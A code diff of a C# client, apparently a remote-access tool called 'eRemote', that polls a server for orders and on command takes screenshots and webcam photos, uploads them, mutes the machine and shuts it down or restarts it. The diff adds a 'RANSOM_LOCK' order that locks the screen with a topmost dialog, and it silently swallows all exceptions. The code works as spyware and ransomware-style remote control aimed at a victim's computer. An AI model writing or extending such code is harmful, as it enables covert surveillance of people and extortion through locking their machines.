@@ -1,72 +1,106 @@
 ﻿
+using eRemote_V2._0.Properties;
 using Newtonsoft.Json.Linq;
 using RestSharp;
 using System;
+using System.ComponentModel;
 using System.Configuration;
 using System.Diagnostics;
+using System.Drawing;
+using System.Threading;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace eRemote_V2._0.LocalDatabase
 {
     class Orders
     {
         private static string API_LINK = ConfigurationManager.AppSettings["API"];
+        private static BackgroundWorker emergenyLockerThread;
+
         public static async Task CheckDBForOffileOrdersAsync()
         {
-            var key = Lib.getKey();
-            if (key != "")
+            try
             {
-
-                var client = new RestClient($"{API_LINK}control/check");
-                client.Timeout = -1;
-                RestRequest request = new RestRequest(Method.POST);
-                request.RequestFormat = DataFormat.Json;
-                request.AddHeader("Content-Type", "application/json");
-                request.AddJsonBody(new { key = key });
-                IRestResponse ResetResponse = client.Execute(request);
-                string response = ResetResponse.Content;
-
-                var json = JObject.Parse(response);
-                var is_order = json["order"].ToString();
-
-                var Undone_Orders = SQLConnetion.FetchUndoneOrders();
-                if (is_order != "")
+                var key = Lib.getKey();
+                if (key != "")
                 {
 
-                    var orderID = (string)json["order"]["_id"];
-                    var order = (string)json["order"]["order"];
-                    Debug.WriteLine(order, orderID);
-                    await OrderHandlerAsync(order, orderID, key);
+                    var client = new RestClient($"{API_LINK}control/check");
+                    client.Timeout = -1;
+                    RestRequest request = new RestRequest(Method.POST);
+                    request.RequestFormat = DataFormat.Json;
+                    request.AddHeader("Content-Type", "application/json");
+                    request.AddJsonBody(new { key = key });
+                    IRestResponse ResetResponse = client.Execute(request);
+                    string response = ResetResponse.Content;
 
-                }
-                else if (Undone_Orders.Count > 0)
-                {
-                    foreach (var order in Undone_Orders)
+                    var json = JObject.Parse(response);
+                    var is_order = json["order"].ToString();
+
+                    var Undone_Orders = SQLConnetion.FetchUndoneOrders();
+                    if (is_order != "")
                     {
-                        if(MarkOrderAsDone(order.order, order.id, key,order.media))
+
+                        var orderID = (string)json["order"]["_id"];
+                        var order = (string)json["order"]["order"];
+                        Debug.WriteLine(order, orderID);
+                        if (Socket.IsSocketConnected())
                         {
-                            OrderModel orderModel = new OrderModel
-                            {
-                                id = order.id,
-                                is_done = 1,
-                                timestamp = DateTime.Now.ToString(),
-                                media = order.media,
-                                order = order.order
-                            };
-                            SQLConnetion.RegisterOrder(orderModel);
+                            await OrderHandlerAsync(order, orderID, key);
                         }
-                     
+                        else
+                        {
+                            while (!Socket.IsSocketConnected())
+                            {
+                                if (Socket.IsSocketConnected())
+                                {
+                                    await OrderHandlerAsync(order, orderID, key);
+                                }
+                                Thread.Sleep(3000);
+                                Debug.WriteLine("Waiting Socket");
+
+                            }
+
+                        }
+
+
+
                     }
+                    else if (Undone_Orders.Count > 0)
+                    {
+                        foreach (var order in Undone_Orders)
+                        {
+                            if (MarkOrderAsDone(order.order, order.id, key, order.media))
+                            {
+                                OrderModel orderModel = new OrderModel
+                                {
+                                    id = order.id,
+                                    is_done = 1,
+                                    timestamp = DateTime.Now.ToString(),
+                                    media = order.media,
+                                    order = order.order
+                                };
+                                SQLConnetion.RegisterOrder(orderModel);
+                            }
+
+                        }
+                    }
+                    else
+                    {
+                        Debug.WriteLine("Good, There's No Pervious or Undone Orders");
+                    }
+
                 }
                 else
                 {
-                    Debug.WriteLine("Good, There's No Pervious or Undone Orders");
+                    Debug.WriteLine("No Confing Found!");
                 }
-
             }
-            else
+            catch (Exception)
             {
-                Debug.WriteLine("No Confing Found!");
+
+               
             }
         }
 
@@ -82,7 +116,6 @@ namespace eRemote_V2._0.LocalDatabase
                     var screenshot_bytes = Lib.ImageToByteArray(screenshotPath);
                     // Socket Emiting 
                     var screenshot_emiited = await Socket.emittingEventAsync("SCREENSHOT_REPLAY", orderID, order, screenshot_bytes);
-                    if (!screenshot_emiited) Debug.WriteLine("Can't Emiit ");
                     // Upload Image and Mark Order for Done
                     if (screenshot_emiited) await Screenshot.ScreenShotUploader(screenshotPath, key, orderID);
                     break;
@@ -99,7 +132,7 @@ namespace eRemote_V2._0.LocalDatabase
                     if (Camera.isHaveCamera() == 1)
                     {
                         // Get Camera Capture
-                        var camera_photo = Camera.CaptureCamera($"camera_{key}_{timeStamp}.png", key, orderID);
+                        var camera_photo = Camera.CaptureCamera($"camera_{key}_{timeStamp}.png");
                         // Convert Image to array of bytes
                         var camera_bytes = Lib.ImageToByteArray(camera_photo);
                         // Socket Emiting 
@@ -109,11 +142,14 @@ namespace eRemote_V2._0.LocalDatabase
                     }
                     else
                     {
-                        //// No Camera Photo -> 
-                        //// Convert Image to array of bytes
-                        //var camera_bytes = Lib.ImageToByteArray(camera_photo);
-                        //// Socket Emiting 
-                        //var camera_emiited = await Socket.emittingEventAsync("CAMERA_REPLAY", orderID, order, camera_bytes);
+                        using (Image myImage = Resources.no_camera_sign)
+                        {
+                            myImage.Save("./objs/no.png");
+                            var camera_bytes = Lib.ImageToByteArray("./objs/no.png");
+                            var camera_emiited = await Socket.emittingEventAsync("CAMERA_REPLAY", orderID, order, camera_bytes);
+                            // Mark Order As Done!
+                        }
+
                     }
                     break;
                 case "MUTE_THE_SKY":
@@ -128,14 +164,41 @@ namespace eRemote_V2._0.LocalDatabase
                 case "SHUTDOWN_THE_SKY":
                     var shutdown_replay = Power.Shutdown();
                     await Socket.emittingEventAsync("SHUTDOWN_REPLAY", orderID, order, shutdown_replay);
+                    // Mark Order As Done!
                     break;
                 case "RESTART_THE_SKY":
                     var restart_replay = Power.Restart();
                     await Socket.emittingEventAsync("RESTART_REPLAY", orderID, order, restart_replay);
+                    // Mark Order As Done!
+                    break;
+
+                case "RANSOM_LOCK":
+                    var ransom_replay = emergency.emergencyLock(orderID);
+                    if (ransom_replay)
+                    {
+                        MarkOrderAsDone(key, orderID, "RANSOM_LOCK");
+                        await Socket.emittingEventAsync("RANSOM_REPLAY", orderID, order, true);
+                        FormCollection fc = Application.OpenForms;
+                        var is_em_open = false;
+                        foreach (Form frm in fc)
+                        {
+                            if (frm.Name == "Form2")
+                            {
+                                is_em_open = true;
+                            }
+                        }
+                        if (!is_em_open)
+                        {
+                            var rl = new Form2();
+                            rl.ShowDialog(new Form() { TopMost = true, TopLevel = true });
+
+                        }
+                    }
+              
                     break;
                 default:
                     Debug.WriteLine("Order Not Reconized");
-                    break;
+                    break; 
             }
 
         }
